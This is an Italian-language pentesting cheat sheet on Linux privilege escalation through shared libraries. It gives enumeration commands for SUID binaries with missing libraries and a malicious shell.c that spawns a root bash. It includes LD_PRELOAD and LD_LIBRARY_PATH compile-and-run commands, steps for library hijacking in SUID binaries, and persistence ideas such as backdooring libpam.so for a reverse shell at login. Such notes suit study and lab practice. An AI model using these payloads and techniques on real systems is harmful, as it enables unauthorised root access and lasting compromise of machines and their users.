#Privesc_Linux

---
---
---
#### INDICE
- [[#Introduzione]]
- [[#Enumerazione]]
- [[#LD_PRELOAD e LD_LIBRARY_PATH]]
- [[#Hijack di librerie condivise]]
- [[#SUID + Librerie]]
- [[#Persistence con Shared Object]]
- [[#GTFOBins]]

---
---
---
### Introduzione
Le **librerie condivise** (`.so`) sono componenti caricati dinamicamente da binari all'esecuzione. Un attaccante può applicare una **Privilege Escalation** se riesce a manipolare o sostituire una libreria caricata da un programma con privilegi elevati (es. SUID root), inserendo codice malevolo da eseguire automaticamente al caricamento.

---
### Enumerazione
Per trovare binari che caricano dinamicamente librerie:

```
ldd /path/to/binario
```

Verifica se qualche percorso punta a directory **scrivibili dall’attaccante** o se il binario è SUID:

```
find / -perm -4000 -type f 2>/dev/null | while read f; do ldd "$f"; done | grep -i "not found"
```

> Cerca librerie **"not found"**: indica che manca una `.so` richiesta → possibilità di **library hijack**.

---
### LD_PRELOAD e LD_LIBRARY_PATH
#### LD_PRELOAD
È una variabile d’ambiente che forza il caricamento di una libreria `.so` **prima** delle altre.  
Se un binario **non è SUID**, puoi usare `LD_PRELOAD` per caricare codice arbitrario.

```
// shell.c - compilare come .so #include <stdio.h> #include <stdlib.h>  void _init() {     setuid(0); setgid(0);     system("/bin/bash"); }
```

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles LD_PRELOAD=./shell.so ./target
```

> ⚠️ **Non funziona se il binario è SUID**, perché LD_PRELOAD viene ignorata per sicurezza.

#### LD_LIBRARY_PATH
Specifica dove cercare le librerie. Se il binario usa `dlopen()` o carica `.so` in modo dinamico e l'attaccante può scrivere nella directory, può forzare il caricamento della sua `.so`:

```
export LD_LIBRARY_PATH=.
./vulnerable_bin
```

---
### Hijack di librerie condivise
Se un **SUID binary** carica una libreria mancante o da un path controllabile, è possibile:

```
`# Ricostruisci la libreria mancante
gcc -shared -fPIC -o libcustom.so shell.c  # Posizionala in una directory cercata dal binario (es. /tmp, ./lib)
cp libcustom.so /tmp  # Esegui il binario che la carica ./vuln`
```

---
### SUID + Librerie
Se trovi un **binario SUID custom** che carica librerie dinamiche, e riesci a scrivere nella path delle librerie o sostituirle:
1. Ricompila una `.so` con payload malevolo (es. `shell.c`).
2. Sovrascrivi la libreria referenziata.
3. Esegui il binario → ottieni shell root.

```
gcc -shared -fPIC -o liblog.so shell.c
cp liblog.so /usr/lib/         
./suid_binary                 
```

---
### Persistence con Shared Object
Puoi anche usare una `.so` malevola per **ottenere persistenza** in un'applicazione che carica plugin (`libpam`, `liblog`, `libcustom.so`, ecc.), eseguendo payload a ogni riavvio o login.

Esempio:
- Modifica `libpam.so` per ottenere reverse shell a ogni login.
- Rinomina `.so` per bypassare controlli (`liblog4j.so`).

---
### GTFOBins
La piattaforma [GTFOBins](https://gtfobins.github.io) cataloga anche binari che **accettano `LD_PRELOAD`** o **caricano librerie dinamiche** come `python`, `perl`, `php`, `node`, ecc.  
Se puoi eseguirli come `sudo`, potresti iniettare facilmente librerie `.so`.

